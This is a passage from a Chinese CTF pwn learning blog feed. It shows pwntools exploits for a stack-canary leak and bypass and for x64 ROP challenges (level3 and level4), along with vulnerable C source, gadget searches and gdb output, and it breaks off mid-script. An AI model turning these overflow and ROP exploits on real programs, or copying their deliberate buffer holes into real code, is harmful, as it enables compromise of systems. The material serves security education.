ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#p32(canary)绕过后我用100个A来查找</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ECX: 0x64 <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>EDX: 0xf7f5a890 --<span class="token operator">></span> 0x0 ESI: 0xf7f59000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>EIP: 0x8048696 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048696 <span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret       0x8048697 <span class="token operator">&lt;</span>main<span class="token operator">></span>:    lea    ecx,<span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>   0x804869b <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    and    esp,0xfffffff0   0x804869e <span class="token operator">&lt;</span>main+7<span class="token operator">></span>:    push   DWORD PTR <span class="token punctuation">[</span>ecx-0x4<span class="token punctuation">]</span>   0x80486a1 <span class="token operator">&lt;</span>main+10<span class="token operator">></span>:    push   ebp<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffb278e0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 84 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffb278e4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 80 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffb278e8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 76 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffb278ec <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 72 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffb278f0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 68 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffb278f4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 64 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffb278f8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 60 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048696 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>可以看到确实绕过了canary而且在ESP提示：后面又88个A，所以多了88个。因此只要12个即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment" spellcheck="true">##不要忘了cookie是随机的</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>[*] Switching to interactive mode[DEBUG] Received 0x64 bytes:    &#39;A&#39; * 0x64AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami[DEBUG] Sent 0x7 bytes:    &#39;whoami\n&#39;[DEBUG] Received 0x7 bytes:    &#39;hunter\n&#39;hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒸米X64</title>
      <link href="/2020/07/10/zheng-mi-x64/"/>
      <url>/2020/07/10/zheng-mi-x64/</url>
      
        <content type="html"><![CDATA[<h2 id="1：X86-X64主要区别"><a href="#1：X86-X64主要区别" class="headerlink" title="1：X86 X64主要区别"></a>1：X86 X64主要区别</h2><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上</li></ul><p><strong>常见寄存器</strong></p><pre class=" language-bash"><code class="language-bash">64-bit             register Lower 32             bits Lower 16             bits Lower 8 bitsrax             eax                         ax                         alrbx             ebx                         bx                         blrcx             ecx                         cx                         clrdx             edx                         dx                         dlrsi             esi                         si                         silrdi             edi                         di                         dilrbp             ebp                         bp                         bplrsp             esp                         sp                         splr8                 r8d                         r8w                     r8br9                 r9d                         r9w                     r9br10             r10d                         r10w                     r10br11             r11d                         r11w                     r11br12             r12d                         r12w                     r12br13             r13d                         r13w                     r13br14             r14d                         r14w                     r14br15             r15d                         r15w                     r15b</code></pre><h2 id="2：例子–level3"><a href="#2：例子–level3" class="headerlink" title="2：例子–level3"></a>2：例子–level3</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">callsystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关闭 stack ，pie </p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level3.c -o level3</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>显然可以由vulnerable函数溢出控制跳转到callsystem函数就能执行system了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#callsystem：0x0000000000400577</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040044e</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400577</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>知道我为啥要在跳转callsystem时加一个ret吗，因为不这样做我在本地执行会出现堆栈不能对齐的错误。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ python level3.py <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./level3'</span><span class="token keyword">:</span> pid 7213<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modeHELLO,WORLD\x00$  </code></pre><p><strong>可以发现X64的栈溢出控制程序转跳和X86没啥区别，就是多注意堆栈不平衡</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>前面提到，x64的可用地址不能大于0x00007fffffffffff，我们用这个程序试一下’</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在gdb直接c一直执行，结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>RIP: 0x4005aa <span class="token punctuation">(</span><span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>vulnerable_function+25<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>vulnerable_function+30<span class="token operator">></span>:    nop   0x4005a9 <span class="token operator">&lt;</span>vulnerable_function+31<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005aa <span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret       0x4005ab <span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp   0x4005ac <span class="token operator">&lt;</span>main+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005af <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    sub    rsp,0x10   0x4005b3 <span class="token operator">&lt;</span>main+8<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x8541000000000000 0016<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0024<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0048<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0056<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00000000004005aa <span class="token keyword">in</span> vulnerable_function <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>停在了vulnerable函数的ret，因为此时可以看到rsp里面是我们的AAAAAAAA即0x4141414141414141大于0x00007fffffffffff所以不会跳转，而是停在ret。那么我们把地址调小</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'ABCDEF\x00\x00'</span>  <span class="token comment" spellcheck="true">#小端序\x00\x00会存在高地址</span><span class="token comment" spellcheck="true">#payload = 'a'*136 + 'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 RIP: 0x464544434241 <span class="token punctuation">(</span><span class="token string">'ABCDEF'</span><span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>Invalid <span class="token variable">$PC</span> address: 0x464544434241<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 0008<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0016<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0040<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0048<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 0056<span class="token operator">|</span> 0x7fffffffded8 --<span class="token operator">></span> 0x4005ab <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x0000464544434241 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>成功跳转到0x0000464544434241即 \x00\x00ABCDEF<br><strong>所以我们在ret地址的时候要注意这个问题可用地址不能大于0x00007fffffffffff</strong></p><h2 id="3：level4"><a href="#3：level4" class="headerlink" title="3：level4"></a>3：level4</h2><p>在leve3的基础上把后门callsystem换成一个输出system地址的函数</p><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token keyword">void</span> <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>同样关闭stack  pie  还有因为用到了dlopen，dlsym函数要加上-ldl</p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level4.c -o level4 -ldl</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个程序会输出system地址那么在本地找到libc.so.6就可以计算出/bin/sh地址，再由vulnerable处的栈溢出控制程序执行system函数即可，但问题是X64函数的前6个参数依次放在对应寄存器中，对于system函数它只有一个参数（/bin/sh）那么就应该放在rdi里面。我们可以控制的只有栈中的数据，想让栈中的/bin/sh地址放到rdi中就得需要pop rdi 指令。<br>所以用ROPgadgates寻找这个指令。</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary level4 --only <span class="token string">'pop|ret'</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x00000000004006d2 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004006d1 <span class="token keyword">:</span> pop rbx <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x0000000000400585 <span class="token keyword">:</span> ret0x0000000000400735 <span class="token keyword">:</span> ret 0xbdb8Unique gadgets found: 4</code></pre><p><strong>对level4文件搜寻没有看到，那么就对libc文件搜寻（本地提前准备好libc文件）</strong></p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary libc.so.6 --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span>0x00000000000221a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x000000000002155f <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret0x000000000005b4fd <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret 0x38</code></pre><p>找到一个：0x000000000002155f : pop rdi ; ret 。<br><strong>需要注意的是这个和在libc文件中找system，/bin/sh一样这个是偏移量，但我们不慌，知道system绝对地址就可以算出pop rid的地址.</strong></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>binsh_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#0x000000000002155f : pop rdi ; ret</span>pop_ret_offset <span class="token operator">=</span> <span class="token number">0x000000000002155f</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level4'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########get system########"</span>system_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token 